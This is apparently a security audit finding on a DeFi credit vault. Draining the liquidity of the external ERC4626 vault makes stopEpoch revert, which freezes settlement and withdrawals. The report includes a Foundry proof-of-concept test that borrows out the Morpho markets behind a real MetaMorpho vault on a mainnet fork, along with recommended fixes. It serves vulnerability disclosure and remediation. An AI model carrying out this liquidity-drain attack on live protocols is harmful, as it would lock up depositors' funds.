### Title
Temporary freeze of epoch settlement and withdrawals through ERC4626 liquidity exhaustion - (`contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
An unprivileged participant in the programmable borrower’s underlying ERC4626 liquidity markets can make `vault.withdraw` revert while the borrower’s vault shares remain solvent, causing every `stopEpoch` call to revert before the CDO’s default handler runs. [1](#0-0) [2](#0-1) 

### Finding Description
In programmable-borrower mode, `IdleCDOEpochVariant._stopEpoch` calls `ProgrammableBorrower.onStopEpoch` before attempting `getFundsFromBorrower`. [2](#0-1)  The hook first checks whether the requested shortfall is covered economically through `convertToAssets`, but it does not compare the request with the ERC4626 vault’s `maxWithdraw` or otherwise account for currently unavailable liquidity. [3](#0-2) [4](#0-3) 

If covered value exists but liquidity is exhausted, `vault.withdraw` reverts and `onStopEpoch` translates that failure into `StopEpochVaultLiquidityUnavailable`. [5](#0-4)  Because this call is outside the CDO’s subsequent `try this.getFundsFromBorrower` block, the revert bubbles out of `stopEpoch`; `_handleBorrowerDefault` is not reached. [6](#0-5) [7](#0-6) 

A concrete attacker path is:

1. A KYC-passing lender requests a withdrawal during the buffer phase, creating `pendingWithdraws`.
2. The manager starts the epoch, and the programmable borrower deposits available assets into the configured ERC4626 vault. [8](#0-7) 
3. An unprivileged market participant borrows the liquid balance from the Morpho markets backing the configured MetaMorpho vault. The programmable borrower’s shares still represent the assets, but withdrawals now lack liquidity.
4. After `epochEndDate`, each manager call to `stopEpoch` reverts. The contract remains `isEpochRunning`, deposits remain paused, and withdrawal requests remain disabled. [9](#0-8) [10](#0-9) 
5. The privileged emergency exit cannot bypass the same dependency while the vault is illiquid because `emergencyExitVault` still calls `vault.redeem`. [11](#0-10) 

The broken invariant is liveness of epoch settlement: a solvent but temporarily illiquid external position causes an unhandled revert instead of a controlled settlement, default, or recovery transition. [2](#0-1) 

### Impact Explanation
The attacker can temporarily freeze the credit vault’s active principal and pending withdrawal claims for as long as the ERC4626 vault remains below the requested withdrawal liquidity. [1](#0-0)  In the reference test setup, a 10,000 USDC deposit can have nearly all of it reserved as a pending withdrawal; if market liquidity is reduced below that amount, repeated `stopEpoch` calls revert while `isEpochRunning` remains true. [12](#0-11) [10](#0-9) 

No funds are directly stolen, and the position can later settle after repayments, liquidations, or new liquidity enter the external vault. [13](#0-12)  The quantifiable exposure is the whole blocked redemption amount plus the active assets that cannot move to the next epoch; for the PoC below this is approximately 10,000 USDC of pool assets and a roughly 9,999 USDC pending withdrawal. [14](#0-13) 

### Likelihood Explanation
The attack requires an unprivileged borrower to post collateral and borrow available liquidity from the Morpho markets used by the configured ERC4626 vault. [15](#0-14) [16](#0-15)  The attacker does not need control over the vault, borrower, owner, manager, guardian, or queue. [17](#0-16) 

The main cost is collateralization and borrow interest, and the attacker must maintain the liquidity shortage until after `epochEndDate`. [10](#0-9)  Ordinary market congestion can produce the same failure accidentally, while an attacker with sufficient collateral can intentionally sustain it across repeated settlement attempts. [5](#0-4) 

### Recommendation
Distinguish economic coverage from withdrawable liquidity in `onStopEpoch`. [1](#0-0)  In particular:

- Compare `shortfall` with `vault.maxWithdraw(address(this))` in addition to `convertToAssets`.
- Withdraw only the currently available amount or return a dedicated unsuccessful result when liquidity is insufficient.
- Let the CDO enter a controlled settlement/default/emergency state instead of reverting before `_handleBorrowerDefault` can run.
- Add an owner recovery path that can mark the epoch stopped or account for the external position without requiring a successful ERC4626 withdrawal.
- Add regression coverage where `convertToAssets` remains sufficient but `maxWithdraw` or `withdraw` reports insufficient liquidity. [18](#0-17) [2](#0-1) 

### Proof of Concept
The following Foundry test extends the existing mainnet-fork setup in `test/foundry/ProgrammableBorrowerCreditVault.t.sol`, which already configures Steakhouse USDC MetaMorpho as the programmable borrower vault. [19](#0-18) [20](#0-19) 

```solidity
// test/foundry/ProgrammableBorrowerCreditVault.t.sol
function testExternalVaultLiquidityCrunchBlocksStopEpoch() external {
    address attacker = makeAddr("liquidity-drainer");
    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    idleCDO.depositAA(amount);

    // Reserve almost the entire pool for the next stopEpoch.
    uint256 trancheAmount = aaTranche.balanceOf(address(this)) - 1;
    uint256 required = cdoEpoch.requestWithdraw(trancheAmount, address(aaTranche));
    assertGt(required, 0, "withdraw request was not registered");

    _startEpochAndCheckPrices(0);
    assertGe(
        morphoVault.maxWithdraw(address(programmableBorrower)),
        required,
        "fork vault should initially have enough liquidity"
    );

    // An unprivileged Morpho borrower drains the markets backing the MetaMorpho vault.
    _drainMetaMorphoWithdrawQueue(attacker);

    // The programmable borrower remains economically covered but cannot withdraw enough.
    assertGe(
        programmableBorrower.totalUnderlying(),
        required,
        "vault shares should still cover the request"
    );
    assertLt(
        morphoVault.maxWithdraw(address(programmableBorrower)),
        required,
        "withdrawable liquidity was not exhausted"
    );

    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    cdoEpoch.stopEpoch(0, 0);

    assertTrue(cdoEpoch.isEpochRunning(), "epoch should remain stuck running");
    assertFalse(cdoEpoch.defaulted(), "liquidity failure incorrectly marked default");
    assertFalse(cdoEpoch.allowAAWithdrawRequest(), "AA requests should remain disabled");
    assertFalse(cdoEpoch.allowBBWithdrawRequest(), "BB requests should remain disabled");

    // The same call remains blocked while the attacker keeps market liquidity exhausted.
    vm.prank(manager);
    vm.expectRevert(StopEpochVaultLiquidityUnavailable.selector);
    cdoEpoch.stopEpoch(0, 0);
}

function _drainMetaMorphoWithdrawQueue(address attacker) internal {
    IMorpho morpho = IMorpho(MORPHO_BLUE);
    uint256 queueLength = morphoVault.withdrawQueueLength();

    for (uint256 i = 0; i < queueLength; ++i) {
        bytes32 marketId = morphoVault.withdrawQueue(i);
        IMorpho.MarketParams memory params = morpho.idToMarketParams(marketId);
        morpho.accrueInterest(params);

        IMorpho.Market memory marketState = morpho.market(marketId);
        uint256 idleLiquidity =
            marketState.totalSupplyAssets - marketState.totalBorrowAssets;
        if (idleLiquidity <= 1) continue;

        uint256 collateralAmount = 1;
        bool borrowed;
        for (uint256 attempt = 0; attempt < 128 && !borrowed; ++attempt) {
            deal(params.collateralToken, attacker, collateralAmount, true);

            vm.startPrank(attacker);
            IERC20Detailed(params.collateralToken).approve(
                MORPHO_BLUE,
                collateralAmount
            );
            morpho.supplyCollateral(params, collateralAmount, attacker, "");

            try morpho.borrow(
                params,
                idleLiquidity - 1,
                0,
                attacker,
                attacker
            ) {
                borrowed = true;
            } catch {
                collateralAmount *= 2;
            }
            vm.stopPrank();
        }

        assertTrue(borrowed, "attacker could not drain a withdraw-queue market");
    }
}
```

The expected result is that both `stopEpoch` calls revert with `StopEpochVaultLiquidityUnavailable`, while the CDO remains running and non-defaulted. [5](#0-4) [2](#0-1)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-222)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L361-371)
```text
  function emergencyExitVault(uint256 _shares) external nonReentrant returns (uint256 assets) {
    _checkOnlyOwnerOrManager();
    if (_shares == 0) {
      _shares = vault.balanceOf(address(this));
    }
    if (_shares == 0) revert InvalidAmount();
    assets = vault.redeem(_shares, address(this), address(this));
    if (epochAccountingActive) {
      epochWithdrawnFromVault += assets;
    }
    emit RedeemedFromVault(_shares, assets, address(this));
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L535-549)
```text
  /// @notice Return the total exposure in underlying terms (on-hand plus vault position).
  function totalUnderlying() external view returns (uint256) {
    return underlyingToken.balanceOf(address(this)) + _currentVaultAssets();
  }

  /// @notice Return the current vault share balance held by this contract.
  function vaultSharesBalance() external view returns (uint256) {
    return vault.balanceOf(address(this));
  }

  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L244-250)
```text
    isEpochRunning = true;
    // prevent deposits
    _pause();

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;
```

**File:** contracts/IdleCDOEpochVariant.sol (L338-345)
```text
    _checkNotAllowed(
      // Check that epoch is running
      !isEpochRunning || 
      // Check that end date is passed
      block.timestamp < epochEndDate || 
      // Check that there are no pending instant withdraws, ie `getInstantWithdrawFunds` was called
      // before closing the epoch
      _pendingInstant() != 0 ||
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-408)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** test/foundry/ProgrammableBorrowerCreditVault.t.sol (L89-98)
```text
  address internal constant TL_MULTISIG = address(0xFb3bD022D5DAcF95eE28a6B07825D4Ff9C5b3814);
  address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  address internal constant MORPHO_BLUE = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
  address internal constant STEAKHOUSE_USDC = 0xBEEF01735c132Ada46AA9aA4c54623cAA92A64CB;
  address internal constant GAUNTLET_USDC_PRIME = 0x8c106EEDAd96553e64287A5A6839c3Cc78afA3D0;
  address internal constant MORPHO_AAVE_USDC = 0xA5269A8e31B93Ff27B887B56720A25F844db0529;
  uint256 internal constant FORK_BLOCK = 19225935;
  uint256 internal constant GAUNTLET_FORK_BLOCK = 24850150;
  string internal constant BORROWER_NAME = "testBorrower";
  uint256 internal constant ONE_TRANCHE_TOKEN = 1e18;
```

**File:** test/foundry/ProgrammableBorrowerCreditVault.t.sol (L120-180)
```text
  function setUp() public {
    _setUpProgrammableBorrowerCreditVault(FORK_BLOCK, STEAKHOUSE_USDC);
  }

  function _setUpProgrammableBorrowerCreditVault(uint256 forkBlock, address vaultAddress) internal {
    vm.createSelectFork("mainnet", forkBlock);

    strategy = new IdleCreditVault();
    stdstore.target(address(strategy)).sig(strategy.token.selector).checked_write(address(0));
    strategy.initialize(USDC, owner, manager, placeholderBorrower, BORROWER_NAME, initialProvidedApr);

    cdoEpoch = new IdleCDOEpochVariant();
    stdstore.target(address(cdoEpoch)).sig(cdoEpoch.token.selector).checked_write(address(0));
    cdoEpoch.initialize(0, USDC, address(this), owner, rebalancer, address(strategy), 100000);
    idleCDO = IdleCDO(address(cdoEpoch));

    underlying = IERC20Detailed(USDC);
    aaTranche = IdleCDOTranche(idleCDO.AATranche());
    bbTranche = IdleCDOTranche(idleCDO.BBTranche());
    oneScale = 10 ** underlying.decimals();

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdoEpoch));
    vm.prank(owner);
    strategy.setMaxApr(0);

    vm.startPrank(owner);
    cdoEpoch.setIsAYSActive(false);
    cdoEpoch.setFeeParams(TL_MULTISIG, 0, 100000, 0);
    cdoEpoch.setInstantWithdrawParams(3 days, 1.5e18, false);
    cdoEpoch.setEpochParams(36.5 days, 5 days);
    cdoEpoch.setKeyringParams(address(0), 0);
    vm.stopPrank();

    deal(USDC, address(this), 1_000_000 * oneScale, true);
    underlying.approve(address(cdoEpoch), type(uint256).max);

    ProgrammableBorrower programmableBorrowerImplementation = new ProgrammableBorrower();
    programmableBorrower = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
      address(programmableBorrowerImplementation),
      makeAddr("programmableBorrowerProxyAdmin"),
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        vaultAddress,
        address(cdoEpoch),
        address(this),
        manager,
        revolvingBorrower,
        365e18
      )
    )));
    morphoVault = IMMVault(vaultAddress);

    vm.prank(owner);
    strategy.setBorrower(address(programmableBorrower));

    vm.prank(owner);
    cdoEpoch.setIsProgrammableBorrower(true);

    vm.prank(manager);
    strategy.setAprs(0, 0);
```

**File:** contracts/interfaces/morpho/IMorpho.sol (L160-181)
```text
  /// @notice Borrows `assets` or `shares` on behalf of `onBehalf` and sends the assets to `receiver`.
  /// @dev Either `assets` or `shares` should be zero. Most use cases should rely on `assets` as an input so the
  /// caller is guaranteed to borrow `assets` of tokens, but the possibility to mint a specific amount of shares is
  /// given for full compatibility and precision.
  /// @dev `msg.sender` must be authorized to manage `onBehalf`'s positions.
  /// @dev Borrowing a large amount can revert for overflow.
  /// @dev Borrowing an amount of shares may lead to borrow fewer assets than expected due to slippage.
  /// Consider using the `assets` parameter to avoid this.
  /// @param marketParams The market to borrow assets from.
  /// @param assets The amount of assets to borrow.
  /// @param shares The amount of shares to mint.
  /// @param onBehalf The address that will own the increased borrow position.
  /// @param receiver The address that will receive the borrowed assets.
  /// @return assetsBorrowed The amount of assets borrowed.
  /// @return sharesBorrowed The amount of shares minted.
  function borrow(
    MarketParams memory marketParams,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    address receiver
  ) external returns (uint256 assetsBorrowed, uint256 sharesBorrowed);
```

**File:** contracts/interfaces/morpho/IMMVault.sol (L13-20)
```text
  function withdrawQueueLength() external view returns (uint256);
  function supplyQueueLength() external view returns (uint256);
  function withdrawQueue(uint256 idx) external view returns (bytes32);
  function supplyQueue(uint256 idx) external view returns (bytes32);
  function convertToAssets(uint256) external view returns (uint256);
  function totalAssets() external view returns (uint256);
  function config(bytes32 id) external view returns (uint184 cap, bool, uint64);
  function maxWithdraw(address) external view returns (uint256);
```
